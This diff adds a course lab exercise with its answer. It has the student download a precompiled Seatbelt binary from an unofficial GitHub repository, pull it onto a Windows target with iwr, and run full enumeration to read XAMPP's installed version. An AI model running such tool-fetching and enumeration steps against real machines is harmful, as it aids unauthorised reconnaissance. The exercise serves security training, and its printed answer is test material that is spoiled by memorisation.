@@ -1,0 +1,20 @@
+Questions 2
+Download a precompiled version of Seatbelt or compile it yourself. To find a precompiled version of Seatbelt, you can enter the search term compiled seatbelt github download in a search engine. Transfer the binary to VM #1 and launch it with the option -group=all. Find a section named InstalledProducts and locate the entry for XAMPP. Enter the value of DisplayVersion as answer to this exercise.
+
+HINT
+After downloading Seatbelt.exe on your local VM, transfer it to your assigned VM #1 by using iwr as shown in Listing 34.
+Run Seatbelt.exe on powershell with the -group=all argument and search for the section named InstalledProducts.
+
+# Download seatbelt.exe
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+chmod 777 Seatbelt.exe
+
+PS C:\Users\dave> iwr -uri http://192.168.45.178/Seatbelt.exe -Outfile Seatbelt.exe
+PS C:\Users\dave> .\Seatbelt.exe -group=all 
+DisplayName                    : XAMPP
+DisplayVersion                 : 7.4.29-1
+Publisher                      : Bitnami
+InstallDate                    : 1/1/0001 12:00:00 AM
+Architecture                   : x64
+
+# DisplayVersion is the answer
